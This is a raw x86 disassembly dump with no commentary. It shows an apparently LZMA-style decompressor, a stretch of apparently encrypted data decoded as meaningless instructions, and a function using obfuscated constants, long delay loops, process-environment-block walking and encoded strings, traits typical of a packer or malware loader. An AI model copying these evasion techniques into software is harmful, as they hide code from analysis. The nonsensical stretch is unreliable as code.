  424558:	add    DWORD PTR [ebp+0x1c],esi
  42455b:	push   esi
  42455c:	mov    esi,DWORD PTR [ebp+0x14]
  42455f:	lods   eax,DWORD PTR ds:[esi]
  424560:	xchg   edx,eax
  424561:	push   edx
  424562:	mov    cl,BYTE PTR [esi-0x2]
  424565:	or     eax,0xffffffff
  424568:	shl    eax,cl
  42456a:	not    eax
  42456c:	push   eax
  42456d:	mov    cl,dh
  42456f:	or     eax,0xffffffff
  424572:	shl    eax,cl
  424574:	not    eax
  424576:	push   eax
  424577:	add    cl,dl
  424579:	mov    edi,esi
  42457b:	sub    esp,0xc
  42457e:	sub    eax,eax
  424580:	inc    eax
  424581:	push   eax
  424582:	push   eax
  424583:	push   eax
  424584:	push   eax
  424585:	push   eax
  424586:	push   edi
  424587:	sub    esi,esi
  424589:	push   esi
  42458a:	or     ebx,0xffffffff
  42458d:	mov    eax,0x300
  424592:	shl    eax,cl
  424594:	lea    ecx,[eax+0x736]
  42459a:	mov    eax,0x4000400
  42459f:	shr    ecx,1
  4245a1:	rep stos DWORD PTR es:[edi],eax
  4245a3:	push   0x5
  4245a5:	pop    ecx
  4245a6:	call   0x424891
  4245ab:	loop   0x4245a6
  4245ad:	lea    esi,[esi]
  4245af:	lea    edi,[edi]
  4245b1:	mov    edi,DWORD PTR [ebp-0x4]
  4245b4:	mov    eax,DWORD PTR [ebp-0x10]
  4245b7:	sub    edi,DWORD PTR [ebp+0x24]
  4245ba:	and    eax,edi
  4245bc:	mov    DWORD PTR [ebp-0x18],eax
  4245bf:	mov    al,0x0
  4245c1:	call   0x4248a9
  4245c6:	jne    0x424661
  4245cc:	mov    cl,BYTE PTR [ebp-0xc]
  4245cf:	and    edi,DWORD PTR [ebp-0x14]
  4245d2:	shl    edi,cl
  4245d4:	sub    cl,0x8
  4245d7:	neg    cl
  4245d9:	shr    esi,cl
  4245db:	pop    eax
  4245dc:	add    edi,esi
  4245de:	pop    esi
  4245df:	lea    edi,[edi+edi*2]
  4245e2:	shl    edi,0x8
  4245e5:	cmp    al,0x7
  4245e7:	pop    edx
  4245e8:	lea    ecx,[esi+edi*2+0xe6c]
  4245ef:	push   ecx
  4245f0:	push   esi
  4245f1:	mov    esi,0x100
  4245f6:	push   eax
  4245f7:	mov    al,0x1
  4245f9:	jb     0x42462f
  4245fb:	mov    edi,DWORD PTR [ebp-0x4]
  4245fe:	sub    edi,DWORD PTR [ebp-0x24]
  424601:	movzx  edi,BYTE PTR [edi]
  424604:	mov    ebp,DWORD PTR [ebp-0x34]
  424607:	shl    edi,1
  424609:	mov    ecx,esi
  42460b:	and    esi,edi
  42460d:	add    ecx,esi
  42460f:	lea    ebp,[ebp+ecx*2+0x0]
  424613:	call   0x4248c8
  424618:	mov    ecx,eax
  42461a:	shr    esi,0x8
  42461d:	and    ecx,0x1
  424620:	cmp    esi,ecx
  424622:	mov    esi,0x100
  424627:	jne    0x424637
  424629:	cmp    eax,esi
  42462b:	jb     0x424604
  42462d:	jmp    0x424643
  42462f:	mov    ebp,DWORD PTR [ebp-0x34]
  424632:	call   0x4248c8
  424637:	inc    eax
  424638:	inc    esi
  424639:	sub    eax,0x1
  42463c:	sub    esi,0x1
  42463f:	cmp    eax,esi
  424641:	jb     0x42462f
  424643:	pop    edx
  424644:	inc    edx
  424645:	cmp    edx,0x5
  424648:	dec    edx
  424649:	mov    ecx,edx
  42464b:	jb     0x42465c
  42464d:	inc    edx
  42464e:	cmp    edx,0xb
  424651:	dec    edx
  424652:	mov    cl,0x4
  424654:	dec    cl
  424656:	jb     0x42465c
  424658:	mov    cl,0x7
  42465a:	dec    cl
  42465c:	sub    edx,ecx
  42465e:	push   edx
  42465f:	jmp    0x4246b0
  424661:	mov    al,0xc1
  424663:	dec    al
  424665:	call   0x4248b9
  42466a:	jne    0x424680
  42466c:	pop    eax
  42466d:	pop    edi
  42466e:	pop    edx
  42466f:	pop    ecx
  424670:	pop    edx
  424671:	pop    ecx
  424672:	push   DWORD PTR [esp]
  424675:	push   ecx
  424676:	push   edx
  424677:	mov    edx,0x664
  42467c:	mov    cl,0x0
  42467e:	jmp    0x4246f3
  424680:	mov    al,0xcd
  424682:	dec    al
  424684:	call   0x4248b9
  424689:	jne    0x4246b9
  42468b:	mov    al,0xf1
  42468d:	dec    al
  42468f:	call   0x4248a9
  424694:	jne    0x4246e9
  424696:	pop    eax
  424697:	cmp    al,0x7
  424699:	mov    al,0x9
  42469b:	jb     0x42469f
  42469d:	mov    al,0xb
  42469f:	push   eax
  4246a0:	mov    esi,DWORD PTR [ebp-0x4]
  4246a3:	sub    esi,DWORD PTR [ebp-0x24]
  4246a6:	cmp    esi,DWORD PTR [ebp+0x24]
  4246a9:	jb     0x424880
  4246af:	lods   al,BYTE PTR ds:[esi]
  4246b0:	mov    edi,DWORD PTR [ebp-0x4]
  4246b3:	stos   BYTE PTR es:[edi],al
  4246b4:	jmp    0x424847
  4246b9:	mov    al,0xd8
  4246bb:	call   0x4248b9
  4246c0:	mov    esi,DWORD PTR [ebp-0x28]
  4246c3:	je     0x4246e0
  4246c5:	mov    al,0xe4
  4246c7:	call   0x4248b9
  4246cc:	mov    esi,DWORD PTR [ebp-0x2c]
  4246cf:	je     0x4246da
  4246d1:	mov    esi,DWORD PTR [ebp-0x30]
  4246d4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4246d7:	mov    DWORD PTR [ebp-0x30],ecx
  4246da:	mov    ecx,DWORD PTR [ebp-0x28]
  4246dd:	mov    DWORD PTR [ebp-0x2c],ecx
  4246e0:	mov    ecx,DWORD PTR [ebp-0x24]
  4246e3:	mov    DWORD PTR [ebp-0x28],ecx
  4246e6:	mov    DWORD PTR [ebp-0x24],esi
  4246e9:	pop    eax
  4246ea:	pop    edi
  4246eb:	pop    ecx
  4246ec:	mov    edx,0xa68
  4246f1:	mov    cl,0x8
  4246f3:	add    edx,edi
  4246f5:	push   edx
  4246f6:	push   edi
  4246f7:	cmp    al,0x7
  4246f9:	mov    al,cl
  4246fb:	jb     0x4246ff
  4246fd:	add    al,0x3
  4246ff:	push   eax
  424700:	mov    ebp,DWORD PTR [ebp-0x34]
  424703:	call   0x4248c6
  424708:	jne    0x42471e
  42470a:	mov    eax,DWORD PTR [ebp-0x18]
  42470d:	mov    edi,DWORD PTR [ebp-0x34]
  424710:	shl    eax,0x3
  424713:	sub    ecx,ecx
  424715:	push   0x8
  424717:	pop    esi
  424718:	lea    edi,[edi+eax*2+0x4]
  42471c:	jmp    0x424753
  42471e:	mov    ebp,DWORD PTR [ebp-0x34]
  424721:	add    ebp,0x2
  424724:	call   0x4248c6
  424729:	jne    0x424743
  42472b:	mov    eax,DWORD PTR [ebp-0x18]
  42472e:	mov    edi,DWORD PTR [ebp-0x34]
  424731:	shl    eax,0x3
  424734:	push   0x8
  424736:	pop    ecx
  424737:	push   0x8
  424739:	pop    esi
  42473a:	lea    edi,[edi+eax*2+0x104]
  424741:	jmp    0x424753
  424743:	mov    edi,0x204
  424748:	add    edi,DWORD PTR [ebp-0x34]
  42474b:	push   0x10
  42474d:	pop    ecx
  42474e:	mov    esi,0x100
  424753:	mov    DWORD PTR [ebp-0x1c],ecx
  424756:	sub    eax,eax
  424758:	inc    eax
  424759:	mov    ebp,edi
  42475b:	call   0x4248c8
  424760:	mov    ecx,eax
  424762:	sub    ecx,esi
  424764:	jb     0x424759
  424766:	add    DWORD PTR [ebp-0x1c],ecx
  424769:	cmp    DWORD PTR [ebp-0x3c],0x4
  42476d:	jae    0x424823
  424773:	add    DWORD PTR [ebp-0x3c],0x7
  424777:	mov    ecx,DWORD PTR [ebp-0x1c]
  42477a:	cmp    ecx,0x4
  42477d:	jb     0x424782
  42477f:	push   0x3
  424781:	pop    ecx
  424782:	mov    edi,DWORD PTR [ebp-0x38]
  424785:	shl    ecx,0x6
  424788:	sub    eax,eax
  42478a:	inc    eax
  42478b:	push   0x40
  42478d:	pop    esi
  42478e:	lea    edi,[edi+ecx*2+0x360]
  424795:	mov    ebp,edi
  424797:	call   0x4248c8
  42479c:	mov    ecx,eax
  42479e:	sub    ecx,esi
  4247a0:	jb     0x424795
  4247a2:	mov    DWORD PTR [ebp-0x18],ecx
  4247a5:	mov    DWORD PTR [ebp-0x24],ecx
  4247a8:	cmp    ecx,0x4
  4247ab:	jb     0x424820
  4247ad:	mov    esi,ecx
  4247af:	and    DWORD PTR [ebp-0x24],0x1
  4247b3:	shr    esi,1
  4247b5:	or     DWORD PTR [ebp-0x24],0x2
  4247b9:	dec    esi
  4247ba:	cmp    ecx,0xe
  4247bd:	jae    0x4247d8
  4247bf:	mov    eax,0x2af
  4247c4:	sub    eax,ecx
  4247c6:	mov    ecx,esi
  4247c8:	shl    BYTE PTR [ebp-0x24],cl
  4247cb:	add    eax,DWORD PTR [ebp-0x24]
  4247ce:	shl    eax,1
  4247d0:	add    eax,DWORD PTR [ebp-0x38]
  4247d3:	mov    DWORD PTR [ebp-0x34],eax
  4247d6:	jmp    0x424805
  4247d8:	sub    esi,0x4
  4247db:	call   0x424885
  4247e0:	shr    ebx,1
  4247e2:	shl    DWORD PTR [ebp-0x24],1
  4247e5:	cmp    DWORD PTR [ebp-0x20],ebx
  4247e8:	jb     0x4247f0
  4247ea:	inc    DWORD PTR [ebp-0x24]
  4247ed:	sub    DWORD PTR [ebp-0x20],ebx
  4247f0:	dec    esi
  4247f1:	jne    0x4247db
  4247f3:	mov    eax,0x644
  4247f8:	add    eax,DWORD PTR [ebp-0x38]
  4247fb:	mov    DWORD PTR [ebp-0x34],eax
  4247fe:	shl    DWORD PTR [ebp-0x24],0x4
  424802:	push   0x4
  424804:	pop    esi
  424805:	sub    edi,edi
  424807:	inc    edi
  424808:	mov    eax,edi
  42480a:	mov    ebp,DWORD PTR [ebp-0x34]
  42480d:	call   0x4248c8
  424812:	test   al,0x1
  424814:	je     0x424819
  424816:	or     DWORD PTR [ebp-0x24],edi
  424819:	shl    edi,1
  42481b:	dec    esi
  42481c:	jne    0x42480a
  42481e:	jmp    0x424820
  424820:	inc    DWORD PTR [ebp-0x24]
  424823:	mov    ecx,DWORD PTR [ebp-0x1c]
  424826:	add    ecx,0x2
  424829:	mov    edi,DWORD PTR [ebp-0x4]
  42482c:	mov    eax,edi
  42482e:	sub    eax,DWORD PTR [ebp+0x24]
  424831:	cmp    DWORD PTR [ebp-0x24],eax
  424834:	ja     0x424880
  424836:	mov    esi,edi
  424838:	sub    esi,DWORD PTR [ebp-0x24]
  42483b:	mov    edx,DWORD PTR [ebp+0x28]
  42483e:	lods   al,BYTE PTR ds:[esi]
  42483f:	stos   BYTE PTR es:[edi],al
  424840:	cmp    edi,edx
  424842:	jae    0x424847
  424844:	dec    ecx
  424845:	jne    0x42483e
  424847:	mov    DWORD PTR [ebp-0x4],edi
  42484a:	movzx  esi,al
  42484d:	cmp    edi,DWORD PTR [ebp+0x28]
  424850:	jb     0x4245b1
  424856:	call   0x424885
  42485b:	sub    eax,eax
  42485d:	lea    ebp,[esp+0x3c]
  424861:	mov    edx,DWORD PTR [ebp+0x20]
  424864:	mov    esi,DWORD PTR [ebp-0x8]
  424867:	sub    esi,DWORD PTR [ebp+0x18]
  42486a:	mov    DWORD PTR [edx],esi
  42486c:	mov    edx,DWORD PTR [ebp+0x2c]
  42486f:	mov    edi,DWORD PTR [ebp-0x4]
  424872:	sub    edi,DWORD PTR [ebp+0x24]
  424875:	mov    DWORD PTR [edx],edi
  424877:	leave  
  424878:	pop    ebx
  424879:	pop    esi
  42487a:	pop    edi
  42487b:	ret    0x1c
  42487e:	pop    esi
  42487f:	pop    eax
  424880:	sub    eax,eax
  424882:	inc    eax
  424883:	jmp    0x42485d
  424885:	cmp    ebx,0x1000000
  42488b:	jb     0x42488e
  42488d:	ret    
  42488e:	shl    ebx,0x8
  424891:	push   esi
  424892:	mov    esi,DWORD PTR [ebp-0x8]
  424895:	cmp    esi,DWORD PTR [ebp+0x1c]
  424898:	jae    0x42487e
  42489a:	mov    eax,DWORD PTR [ebp-0x20]
  42489d:	shl    eax,0x8
  4248a0:	lods   al,BYTE PTR ds:[esi]
  4248a1:	scas   eax,DWORD PTR es:[edi]
  4248a2:	sahf   
  4248a3:	or     al,0xaf
  4248a5:	pop    esi
  4248a6:	ins    BYTE PTR es:[edi],dx
  4248a7:	add    bl,BYTE PTR [eax-0x3a634149]
  4248ad:	arpl   WORD PTR [eax+edx*4-0x616a66f0],cx
  4248b4:	sub    al,0x95
  4248b6:	nop
  4248b7:	cmp    BYTE PTR [ecx-0x6a739c3b],ah
  4248bd:	sahf   
  4248be:	pushf  
  4248bf:	mov    bh,0x3e
  4248c1:	lods   al,BYTE PTR ds:[esi]
  4248c2:	mov    edi,0x35899e3a
  4248c7:	mov    WORD PTR [edi-0x707661c6],?
  4248cd:	js     0x424858
  4248cf:	mov    DWORD PTR [ecx-0x4806a973],ecx
  4248d5:	mov    edx,0x1a906919
  4248da:	sbb    DWORD PTR [ecx],ecx
  4248dc:	test   eax,0xfa19ba75
  4248e1:	push   esi
  4248e2:	sti    
  4248e3:	mov    bl,0xcd
  4248e5:	mov    BYTE PTR [edx+0x18906919],bl
  4248eb:	test   eax,0x919daab
  4248f0:	mov    bh,0xb8
  4248f2:	lds    esp,FWORD PTR [edi-0x22]
  4248f5:	mov    DWORD PTR [eax+0x47c5b530],edx
  4248fb:	mov    ah,0x6d
  4248fd:	mov    edx,0xe5560919
  424902:	mov    bh,0xf0
  424904:	outs   dx,DWORD PTR ds:[esi]
  424905:	mov    DWORD PTR [ecx-0x4bca7677],ebp
  42490b:	nop
  42490c:	xor    BYTE PTR [ebp-0x764172de],bl
  424912:	xchg   ebp,eax
  424913:	mov    WORD PTR [edi-0x6775e6c6],?
  424919:	nop
  42491a:	xor    al,0x9d
  42491c:	sub    eax,0x350919ba
  424921:	fldenv [esi+0x29]
  424924:	push   ebp
  424925:	add    BYTE PTR [ebx],al
  424927:	rol    BYTE PTR [ebx+0x6c8d01c0],0x24
  42492e:	inc    eax
  42492f:	ret    
  424930:	push   ebp
  424931:	mov    ebp,esp
  424933:	sub    esp,0x12c
  424939:	push   ebx
  42493a:	push   esi
  42493b:	push   edi
  42493c:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  424943:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42494a:	mov    eax,DWORD PTR [ebp+0x8]
  42494d:	mov    DWORD PTR [ebp+0x8],eax
  424950:	mov    ecx,DWORD PTR [ebp-0x10]
  424953:	mov    ebx,0x75108af
  424958:	xor    ecx,ebx
  42495a:	mov    eax,0x3272f6
  42495f:	add    ecx,eax
  424961:	mov    DWORD PTR [ebp-0x2c],ecx
  424964:	mov    ecx,DWORD PTR [ebp-0x10]
  424967:	xor    ecx,ebx
  424969:	add    ecx,eax
  42496b:	mov    DWORD PTR [ebp-0x3c],ecx
  42496e:	mov    ecx,DWORD PTR [ebp-0x10]
  424971:	xor    ecx,ebx
  424973:	add    ecx,eax
  424975:	mov    DWORD PTR [ebp-0x40],ecx
  424978:	mov    ecx,DWORD PTR [ebp-0x10]
  42497b:	xor    ecx,ebx
  42497d:	add    ecx,eax
  42497f:	mov    DWORD PTR [ebp-0xd8],ecx
  424985:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  42498c:	mov    DWORD PTR [ebp-0x40],0xf89cb5a5
  424993:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  42499a:	push   0x25
  42499c:	pop    ecx
  42499d:	mov    DWORD PTR [ebp-0x38],ecx
  4249a0:	mov    DWORD PTR [ebp-0x38],ecx
  4249a3:	push   0x65
  4249a5:	pop    ecx
  4249a6:	mov    DWORD PTR [ebp-0x38],ecx
  4249a9:	mov    DWORD PTR [ebp-0x38],ecx
  4249ac:	mov    DWORD PTR [ebp-0x38],0x4d
  4249b3:	mov    DWORD PTR [ebp-0x38],0x43
  4249ba:	mov    ecx,DWORD PTR [ebp-0x10]
  4249bd:	xor    ecx,ebx
  4249bf:	add    ecx,eax
  4249c1:	mov    DWORD PTR [ebp-0x38],ecx
  4249c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4249c7:	xor    ecx,ebx
  4249c9:	add    ecx,eax
  4249cb:	mov    DWORD PTR [ebp-0x38],ecx
  4249ce:	mov    DWORD PTR [ebp-0x28],0x258
  4249d5:	mov    DWORD PTR [ebp-0x20],0x36
  4249dc:	mov    DWORD PTR [ebp-0x14],0x7a
  4249e3:	lea    edi,[ebp-0x10c]
  4249e9:	lea    esi,[ebp-0x12c]
  4249ef:	call   0x4256b1
  4249f4:	dec    DWORD PTR [ebp-0x14]
  4249f7:	jne    0x4249e3
  4249f9:	dec    DWORD PTR [ebp-0x20]
  4249fc:	jne    0x4249dc
  4249fe:	dec    DWORD PTR [ebp-0x28]
  424a01:	jne    0x4249d5
  424a03:	mov    DWORD PTR [ebp-0x28],0x400e
  424a0a:	mov    eax,DWORD PTR [ebp-0x10]
  424a0d:	xor    eax,ebx
  424a0f:	mov    esi,0x3272f6
  424a14:	add    eax,esi
  424a16:	mov    DWORD PTR [ebp-0x1c],eax
  424a19:	mov    eax,DWORD PTR [ebp-0x10]
  424a1c:	and    DWORD PTR [ebp-0x94],0x0
  424a23:	xor    eax,ebx
  424a25:	add    eax,esi
  424a27:	mov    DWORD PTR [ebp-0x34],eax
  424a2a:	mov    eax,fs:0x18
  424a30:	mov    DWORD PTR [ebp-0x94],eax
  424a36:	mov    eax,DWORD PTR [eax+0x30]
  424a39:	mov    DWORD PTR [ebp-0xcc],eax
  424a3f:	mov    eax,DWORD PTR [eax+0xc]
  424a42:	mov    DWORD PTR [ebp-0xc0],eax
  424a48:	mov    eax,DWORD PTR [ebp+0x8]
  424a4b:	lea    ecx,[ebp-0x94]
  424a51:	mov    DWORD PTR [eax+0x1a0],ecx
  424a57:	mov    eax,DWORD PTR [ebp+0x8]
  424a5a:	lea    ecx,[ebp-0xcc]
  424a60:	mov    DWORD PTR [eax+0x1a4],ecx
  424a66:	mov    eax,DWORD PTR [ebp+0x8]
  424a69:	push   DWORD PTR [ebp+0x8]
  424a6c:	lea    ecx,[ebp-0xc0]
  424a72:	mov    DWORD PTR [eax+0x1a8],ecx
  424a78:	call   0x426e72
  424a7d:	mov    ecx,DWORD PTR [ebp-0x10]
  424a80:	xor    ecx,ebx
  424a82:	add    ecx,esi
  424a84:	cmp    ecx,eax
  424a86:	je     0x424e09
  424a8c:	mov    eax,DWORD PTR [ebp+0x8]
  424a8f:	mov    eax,DWORD PTR [eax+0x194]
  424a95:	mov    ecx,DWORD PTR [eax]
  424a97:	mov    eax,DWORD PTR [ebp+0x8]
  424a9a:	mov    eax,DWORD PTR [eax+0x194]
  424aa0:	mov    eax,DWORD PTR [eax]
  424aa2:	add    eax,DWORD PTR [ecx+0x3c]
  424aa5:	mov    ecx,DWORD PTR [ebp+0x8]
  424aa8:	mov    ecx,DWORD PTR [ecx+0x1e0]
  424aae:	lea    edx,[ebp-0xec]
  424ab4:	push   edx
  424ab5:	mov    edx,DWORD PTR [ebp+0x8]
  424ab8:	mov    edx,DWORD PTR [edx+0x18c]
  424abe:	mov    edx,DWORD PTR [edx]
  424ac0:	add    edx,DWORD PTR [eax+0x88]
  424ac6:	push   0x4
  424ac8:	push   DWORD PTR [eax+0x8c]
  424ace:	push   edx
  424acf:	call   DWORD PTR [ecx+0x1c]
  424ad2:	push   DWORD PTR [ebp+0x8]
  424ad5:	xor    eax,eax
  424ad7:	mov    DWORD PTR [ebp-0xa8],0x1b40103a
  424ae1:	mov    DWORD PTR [ebp-0xa4],0x14371122
  424aeb:	mov    DWORD PTR [ebp-0xa0],0x42111e0c
  424af5:	mov    BYTE PTR [ebp-0x9c],0x83
  424afc:	lea    edi,[ebp-0x9b]
  424b02:	stos   DWORD PTR es:[edi],eax
  424b03:	stos   WORD PTR es:[edi],ax
  424b05:	stos   BYTE PTR es:[edi],al
  424b06:	xor    eax,eax
  424b08:	mov    DWORD PTR [ebp-0xbc],0x1b40103a
  424b12:	mov    DWORD PTR [ebp-0xb8],0x14371122
  424b1c:	mov    DWORD PTR [ebp-0xb4],0x2c111e0c
  424b26:	mov    BYTE PTR [ebp-0xb0],0x83
  424b2d:	lea    edi,[ebp-0xaf]
  424b33:	stos   DWORD PTR es:[edi],eax
  424b34:	stos   WORD PTR es:[edi],ax
  424b36:	stos   BYTE PTR es:[edi],al
  424b37:	mov    edi,DWORD PTR [ebp+0x8]
  424b3a:	mov    eax,DWORD PTR [ebp+0x8]
  424b3d:	mov    edx,DWORD PTR [eax+0x1b8]
  424b43:	mov    DWORD PTR [ebp-0x68],0x110f1017
  424b4a:	mov    DWORD PTR [ebp-0x64],0x1a131620
  424b51:	mov    WORD PTR [ebp-0x60],0x8342
  424b57:	mov    DWORD PTR [ebp-0x90],0x1b40103a
  424b61:	mov    DWORD PTR [ebp-0x8c],0x17421122
  424b6b:	mov    DWORD PTR [ebp-0x88],0x35221b13
  424b75:	mov    DWORD PTR [ebp-0x84],0x111e160e
  424b7f:	mov    DWORD PTR [ebp-0x80],0x8342201a
  424b86:	mov    DWORD PTR [ebp-0x7c],0x1b40103a
  424b8d:	mov    DWORD PTR [ebp-0x78],0x17421122
  424b94:	mov    DWORD PTR [ebp-0x74],0x35221b13
  424b9b:	mov    DWORD PTR [ebp-0x70],0x111e160e
  424ba2:	mov    DWORD PTR [ebp-0x6c],0x832c201a
  424ba9:	call   0x426ea1
  424bae:	push   eax
  424baf:	mov    eax,DWORD PTR [ebp+0x8]
  424bb2:	mov    eax,DWORD PTR [eax+0x1a8]
  424bb8:	push   DWORD PTR [eax]
  424bba:	call   0x426b42
  424bbf:	test   eax,eax
  424bc1:	jne    0x424c13
  424bc3:	mov    eax,DWORD PTR [ebp+0x8]
  424bc6:	mov    eax,DWORD PTR [eax+0x1e0]
  424bcc:	mov    edi,DWORD PTR [ebp+0x8]
  424bcf:	add    eax,0x4
  424bd2:	mov    DWORD PTR [ebp-0x24],eax
  424bd5:	mov    eax,DWORD PTR [ebp+0x8]
  424bd8:	mov    edx,DWORD PTR [eax+0x1b8]
  424bde:	call   0x426ea1
  424be3:	push   eax
  424be4:	mov    eax,DWORD PTR [ebp-0x24]
  424be7:	call   DWORD PTR [eax]
  424be9:	test   eax,eax
  424beb:	jne    0x424c13
  424bed:	mov    eax,DWORD PTR [ebp+0x8]
  424bf0:	mov    eax,DWORD PTR [eax+0x1e0]
  424bf6:	mov    edi,DWORD PTR [ebp+0x8]
  424bf9:	add    eax,0x10
  424bfc:	mov    DWORD PTR [ebp-0x24],eax
  424bff:	mov    eax,DWORD PTR [ebp+0x8]
  424c02:	mov    edx,DWORD PTR [eax+0x1b8]
  424c08:	call   0x426ea1
  424c0d:	push   eax
  424c0e:	mov    eax,DWORD PTR [ebp-0x24]
  424c11:	call   DWORD PTR [eax]
  424c13:	mov    eax,DWORD PTR [ebp-0x10]
  424c16:	mov    ecx,DWORD PTR [ebp-0x28]
  424c19:	xor    eax,ebx
  424c1b:	add    eax,esi
  424c1d:	cmp    eax,ecx
  424c1f:	je     0x424de2
  424c25:	mov    eax,DWORD PTR [ebp-0x18]
  424c28:	xor    eax,ebx
  424c2a:	mov    ecx,0xffcd8d0a
  424c2f:	sub    ecx,eax
  424c31:	add    ecx,DWORD PTR [ebp-0x28]
  424c34:	mov    eax,DWORD PTR [ebp-0x1c]
  424c37:	cmp    eax,ecx
  424c39:	ja     0x424de2
  424c3f:	mov    DWORD PTR [ebp-0x20],0x0
  424c46:	push   DWORD PTR [ebp+0x8]
  424c49:	mov    edi,DWORD PTR [ebp+0x8]
  424c4c:	mov    eax,DWORD PTR [ebp+0x8]
  424c4f:	mov    edx,DWORD PTR [eax+0x1b4]
  424c55:	call   0x426ea1
  424c5a:	push   eax
  424c5b:	mov    eax,DWORD PTR [ebp+0x8]
  424c5e:	mov    eax,DWORD PTR [eax+0x1a8]
  424c64:	push   DWORD PTR [eax]
  424c66:	call   0x426b42
  424c6b:	mov    ecx,DWORD PTR [ebp+0x8]
  424c6e:	mov    ecx,DWORD PTR [ecx+0x19c]
  424c74:	mov    DWORD PTR [ecx],eax
  424c76:	mov    eax,DWORD PTR [ebp+0x8]
  424c79:	mov    edi,DWORD PTR [eax+0x1e0]
  424c7f:	mov    esi,DWORD PTR [ebp+0x8]
  424c82:	xor    eax,eax
  424c84:	lea    edx,[ebp-0x7c]
  424c87:	call   0x426ed7
  424c8c:	push   eax
  424c8d:	mov    eax,DWORD PTR [ebp+0x8]
  424c90:	mov    eax,DWORD PTR [eax+0x19c]
  424c96:	push   DWORD PTR [eax]
  424c98:	call   DWORD PTR [edi+0x8]
  424c9b:	mov    DWORD PTR [ebp-0x24],eax
  424c9e:	mov    eax,DWORD PTR [ebp+0x8]
  424ca1:	mov    edi,DWORD PTR [eax+0x1e0]
  424ca7:	mov    esi,DWORD PTR [ebp+0x8]
  424caa:	xor    eax,eax
  424cac:	lea    edx,[ebp-0x90]
  424cb2:	call   0x426ed7
  424cb7:	push   eax
  424cb8:	mov    eax,DWORD PTR [ebp+0x8]
  424cbb:	mov    eax,DWORD PTR [eax+0x19c]
  424cc1:	push   DWORD PTR [eax]
  424cc3:	call   DWORD PTR [edi+0x8]
  424cc6:	mov    eax,DWORD PTR [ebp+0x8]
  424cc9:	mov    edi,DWORD PTR [eax+0x1e0]
  424ccf:	mov    esi,DWORD PTR [ebp+0x8]
  424cd2:	xor    eax,eax
  424cd4:	lea    edx,[ebp-0xa8]
  424cda:	call   0x426ed7
  424cdf:	push   eax
  424ce0:	mov    eax,DWORD PTR [ebp+0x8]
  424ce3:	mov    eax,DWORD PTR [eax+0x19c]
  424ce9:	push   DWORD PTR [eax]
  424ceb:	call   DWORD PTR [edi+0x8]
  424cee:	and    DWORD PTR [ebp-0x8],0x0
  424cf2:	mov    DWORD PTR [ebp-0x44],eax
  424cf5:	mov    eax,DWORD PTR [ebp-0x8]
  424cf8:	and    eax,0x7
  424cfb:	add    eax,0x31
  424cfe:	push   eax
  424cff:	call   DWORD PTR [ebp-0x24]
  424d02:	test   eax,eax
  424d04:	je     0x424d48
  424d06:	mov    eax,DWORD PTR [ebp-0x8]
  424d09:	push   0x19
  424d0b:	xor    edx,edx
  424d0d:	pop    ecx
  424d0e:	div    ecx
  424d10:	add    dl,0x41
  424d13:	movzx  eax,dl
  424d16:	push   eax
  424d17:	call   DWORD PTR [ebp-0x44]
  424d1a:	test   eax,eax
  424d1c:	jne    0x424d48
  424d1e:	mov    eax,DWORD PTR [ebp+0x8]
  424d21:	mov    edi,DWORD PTR [eax+0x1e0]
  424d27:	mov    esi,DWORD PTR [ebp+0x8]
  424d2a:	xor    eax,eax
  424d2c:	lea    edx,[ebp-0x68]
  424d2f:	call   0x426ed7
  424d34:	push   eax
  424d35:	mov    eax,DWORD PTR [ebp+0x8]
  424d38:	mov    eax,DWORD PTR [eax+0x198]
  424d3e:	push   DWORD PTR [eax]
  424d40:	call   DWORD PTR [edi+0x8]
  424d43:	mov    DWORD PTR [ebp-0x14],eax
  424d46:	jmp    0x424d4c
  424d48:	and    DWORD PTR [ebp-0x14],0x0
  424d4c:	inc    DWORD PTR [ebp-0x8]
  424d4f:	cmp    DWORD PTR [ebp-0x8],0x10
  424d53:	jb     0x424cf5
  424d55:	mov    eax,DWORD PTR [ebp-0x18]
  424d58:	mov    esi,DWORD PTR [ebp+0x8]
  424d5b:	xor    eax,ebx
  424d5d:	mov    edi,0x3272f6
  424d62:	add    eax,edi
  424d64:	lea    edx,[ebp-0x10c]
  424d6a:	call   0x426ed7
  424d6f:	push   eax
  424d70:	mov    eax,DWORD PTR [ebp-0x10]
  424d73:	mov    esi,DWORD PTR [ebp+0x8]
  424d76:	xor    eax,ebx
  424d78:	add    eax,edi
  424d7a:	lea    edx,[ebp-0x12c]
  424d80:	call   0x426ed7
  424d85:	push   eax
  424d86:	call   DWORD PTR [ebp-0x14]
  424d89:	mov    ecx,DWORD PTR [ebp-0x10]
  424d8c:	xor    ecx,ebx
  424d8e:	add    ecx,edi
  424d90:	cmp    ecx,eax
  424d92:	jne    0x424d9b
  424d94:	mov    DWORD PTR [ebp-0x20],0x1
  424d9b:	mov    eax,DWORD PTR [ebp-0x18]
  424d9e:	mov    ecx,DWORD PTR [ebp-0x1c]
  424da1:	xor    eax,ebx
  424da3:	lea    eax,[eax+ecx*1+0x3272f6]
  424daa:	mov    DWORD PTR [ebp-0x1c],eax
  424dad:	mov    eax,DWORD PTR [ebp-0x20]
  424db0:	test   eax,eax
  424db2:	je     0x424dc6
  424db4:	mov    eax,DWORD PTR [ebp-0x18]
  424db7:	mov    ecx,DWORD PTR [ebp-0x34]
  424dba:	xor    eax,ebx
  424dbc:	lea    eax,[eax+ecx*1+0x3272f6]
  424dc3:	mov    DWORD PTR [ebp-0x34],eax
  424dc6:	mov    eax,DWORD PTR [ebp-0x18]
  424dc9:	xor    eax,ebx
  424dcb:	mov    ecx,0xffcd8d0a
  424dd0:	sub    ecx,eax
  424dd2:	add    ecx,DWORD PTR [ebp-0x28]
  424dd5:	mov    eax,DWORD PTR [ebp-0x1c]
  424dd8:	cmp    eax,ecx
  424dda:	jbe    0x424c3f
  424de0:	mov    esi,edi
  424de2:	mov    eax,DWORD PTR [ebp-0x34]
  424de5:	mov    ecx,DWORD PTR [ebp-0x1c]
  424de8:	cmp    ecx,eax
  424dea:	jne    0x424dfd
  424dec:	push   DWORD PTR [ebp+0x8]
  424def:	lea    eax,[ebp-0x3c]
  424df2:	push   eax
  424df3:	call   0x427946
  424df8:	mov    DWORD PTR [ebp-0x2c],eax
  424dfb:	jmp    0x424e09
  424dfd:	mov    eax,DWORD PTR [ebp-0x2c]
  424e00:	mov    ecx,DWORD PTR [ebp-0x18]
